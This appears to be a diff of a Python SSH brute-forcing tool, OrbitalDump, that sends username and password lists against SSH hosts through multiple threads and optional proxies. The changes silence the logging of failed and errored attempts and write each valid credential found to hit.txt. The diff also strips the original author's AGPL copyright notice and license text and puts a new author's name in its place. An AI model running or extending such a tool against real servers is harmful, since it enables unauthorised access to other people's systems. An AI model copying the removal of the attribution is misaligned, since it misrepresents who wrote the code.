@@ -1,25 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
 """
-Copyright (C) 2021-2022 K4YT3X and contributors.
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as
-published by the Free Software Foundation, either version 3 of the
-License, or (at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU Affero General Public License for more details.
-
-You should have received a copy of the GNU Affero General Public License
-along with this program. If not, see <https://www.gnu.org/licenses/>.
-
 Name: OrbitalDump
-Author: K4YT3X
-Date Created: June 6, 2021
-Last Modified: April 30, 2022
+Author: Mehdi Rezaei Far
+Date Created: Nov 30, 2022
+Last Modified: Nov 30, 2022
+Version : 1.0
 
 A simple multi-threaded distributed SSH brute-forcing tool written in Python.
 """
@@ -33,7 +20,6 @@ import socket
 import sys
 import threading
 import time
-
 import paramiko
 import requests
 import socks
@@ -41,11 +27,9 @@ from loguru import logger
 
 # format string for Loguru loggers
 LOGURU_FORMAT = (
-    "<green>{time:HH:mm:ss.SSSSSS!UTC}</green> | "
-    "<level>{level: <8}</level> | "
+    " <level>{level: <2}</level> | "
     "<level>{message}</level>"
 )
-
 
 class SshBruteForcer(threading.Thread):
     """
@@ -105,7 +89,7 @@ class SshBruteForcer(threading.Thread):
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
                 logger.debug(
-                    f"Testing {username}@{hostname}:{port}:{password}"
+                    f"Connect to : {username}@{hostname}:{port}:{password}"
                     + (f" with proxy {self.proxy}" if self.proxies else "")
                 )
 
@@ -120,10 +104,7 @@ class SshBruteForcer(threading.Thread):
 
             # authentication failure (wrong password)
             except paramiko.AuthenticationException:
-                logger.info(
-                    f"(queue size: {self.jobs.qsize()}) Invalid credential: "
-                    f"{username}@{hostname}:{port}:{password}"
-                )
+                pass
 
             # connection timeout
             except (
@@ -132,18 +113,12 @@ class SshBruteForcer(threading.Thread):
                 socks.ProxyConnectionError,
                 paramiko.SSHException,
             ):
-                logger.debug(
-                    f"(queue size: {self.jobs.qsize()}) Connection error: "
-                    f"{username}@{hostname}:{port}:{password}"
-                )
-                self.jobs.put((hostname, username, password, port, timeout))
+                pass
+                #self.jobs.put((hostname, username, password, port, timeout))
 
             # other uncaught exceptions
             except Exception as error:
-                logger.error(
-                    f"(queue size: {self.jobs.qsize()}) Uncaught exception {error}: "
-                    f"{username}@{hostname}:{port}:{password}"
-                )
+                pass
 
             # login successful
             else:
@@ -151,6 +126,7 @@ class SshBruteForcer(threading.Thread):
                     f"(queue size: {self.jobs.qsize()}) Valid credential found: "
                     f"{username}@{hostname}:{port}:{password}"
                 )
+                open("hit.txt", "w").write(f"{username}@{hostname}:{port}:{password}")
                 self.valid_credentials.append(
                     (hostname, username, password, port, timeout)
                 )
@@ -266,6 +242,7 @@ def main() -> int:
             proxies = get_proxies()
 
         # create threads
+        print("--------------------------------------")
         logger.info(f"Launching {args.threads} brute-forcer threads")
         for thread_id in range(args.threads):
             thread = SshBruteForcer(jobs, valid_credentials, proxies)
@@ -282,6 +259,7 @@ def main() -> int:
             hostnames = hostname_file.readlines()
         # add username and password combinations to jobs queue
         logger.info("Loading usernames and passwords into queue")
+        print("--------------------------------------")
         for hostname in hostnames:
             for username in usernames:
                 for password in passwords:
@@ -324,11 +302,11 @@ def main() -> int:
         )
         for hostname, username, password, port, timeout in valid_credentials:
             print(f"{username}@{hostname}:{port}:{password}")
-            open("hit.txt", "w").write(f"{username}@{hostname}:{port}:{password}")
         return 0
 
     except Exception as error:
-        logger.exception(error)
+        #logger.exception(error)
+        logger.exception(f"Exception Error : (Section Thread)")
         return 1
 
 
